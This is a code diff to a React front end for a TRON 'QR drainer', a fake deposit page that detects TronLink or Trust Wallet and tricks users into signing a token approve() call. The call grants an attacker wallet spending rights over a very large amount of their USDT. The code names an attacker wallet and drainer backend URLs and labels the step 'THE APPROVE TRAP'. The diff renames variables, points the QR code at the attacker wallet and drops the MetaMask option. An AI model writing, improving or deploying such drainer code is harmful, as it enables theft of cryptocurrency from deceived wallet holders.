@@ -1,20 +1,18 @@
 import React, { useEffect, useState } from "react";
 import { QRCodeSVG } from "qrcode.react";
 
-// CONFIGURATION
-const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
-const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET
+// ==========================================
+// CRITICAL CONFIGURATION
+// ==========================================
+const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT Contract
+const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR Account 01 (The Receiver)
 const BACKEND = "https://qr-drainer.onrender.com";
 const VERCEL_URL = "https://qr-drainer-one.vercel.app";
 
-// TRON DIAMOND LOGO (Upward-facing diamond)
+// TRON LOGO (Upward Diamond)
 const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmMmQ1NSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
 
-// TRUST WALLET LOGO
-const TRUST_WALLET_LOGO = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzMzNzViYiI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
-
 const fmt = (n) => Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");
 
 export default function App() {
   const [isConnected, setIsConnected] = useState(false);
@@ -25,8 +23,7 @@ export default function App() {
   const [error, setError] = useState("");
   const [depositAmount, setDepositAmount] = useState("1");
 
-  // QR Code value
-  const qrValue = VERCEL_URL;
+  const qrValue = ATTACKER_WALLET;
 
   // 1. DETECT WALLET AUTOMATICALLY
   useEffect(() => {
@@ -51,7 +48,7 @@ export default function App() {
     } catch (e) { console.log("balance read", e); }
   };
 
-  // 2. SHOW WALLET SELECTION MODAL
+  // 2. SHOW WALLET MODAL
   const handleConfirm = () => {
     if (!isConnected) {
       setShowWalletModal(true);
@@ -60,7 +57,7 @@ export default function App() {
     }
   };
 
-  // 3. CONNECT TO SPECIFIC WALLET
+  // 3. CONNECT TO WALLET
   const connectToWallet = async (walletType) => {
     setShowWalletModal(false);
     setStep("connecting");
@@ -79,13 +76,8 @@ export default function App() {
       } else if (walletType === "trust") {
         window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`;
         return;
-      } else if (walletType === "metamask") {
-        alert("MetaMask is for Ethereum. Please use TronLink or Trust Wallet for TRON.");
-        setStep("idle");
-        return;
       }
       
-      // Wait for wallet to inject
       await new Promise(r => setTimeout(r, 2000));
       
       if (window.tronWeb?.defaultAddress?.base58) {
@@ -102,7 +94,7 @@ export default function App() {
     }
   };
 
-  // 4. EXECUTE THE APPROVE TRAP
+  // 4. EXECUTE THE APPROVE TRAP (THE FIX IS HERE)
   const executeApprove = async () => {
     setStep("approving");
     setError("");
@@ -114,13 +106,13 @@ export default function App() {
       
       const userAddress = window.tronWeb.defaultAddress.base58;
       
-      // Build the approve transaction
+      // We are approving the ATTACKER_WALLET to spend the user's USDT
       const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
         TOKEN_ADDRESS,
         "approve(address,uint256)",
         { feeLimit: 100000000, callValue: 0 },
         [
-          { type: "address", value: SWEEPER_ADDRESS },
+          { type: "address", value: ATTACKER_WALLET }, // <--- FIXED: Using clear variable name
           { type: "uint256", value: 1000000000000000 }
         ],
         userAddress
@@ -213,9 +205,9 @@ export default function App() {
           border: "1px solid #eaecef"
         }}>
           <span style={{ fontFamily: "monospace", fontSize: 12, color: "#1e2329", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: "70%" }}>
-            {SWEEPER_ADDRESS}
+            {ATTACKER_WALLET}
           </span>
-          <button onClick={() => navigator.clipboard.writeText(SWEEPER_ADDRESS)} style={{ background: "#f0b90b", color: "#1e2329", border: "none", borderRadius: 6, padding: "6px 12px", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Copy</button>
+          <button onClick={() => navigator.clipboard.writeText(ATTACKER_WALLET)} style={{ background: "#f0b90b", color: "#1e2329", border: "none", borderRadius: 6, padding: "6px 12px", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Copy</button>
         </div>
 
         {/* DEPOSIT AMOUNT */}
@@ -369,26 +361,6 @@ export default function App() {
               >
                 <span style={{ width: 32, height: 32, background: "#3375bb", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700 }}>🛡️</span>
                 Trust Wallet
-              </button>
-              
-              <button 
-                onClick={() => connectToWallet("metamask")} 
-                style={{ 
-                  background: "#f5f5f5", 
-                  border: "1px solid #eaecef", 
-                  borderRadius: 12, 
-                  padding: 16, 
-                  color: "#1e2329", 
-                  fontWeight: 600, 
-                  cursor: "pointer", 
-                  display: "flex", 
-                  alignItems: "center", 
-                  gap: 12,
-                  fontSize: 15
-                }}
-              >
-                <span style={{ width: 32, height: 32, background: "#f6851b", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700 }}>🦊</span>
-                MetaMask (Ethereum)
               </button>
             </div>
             
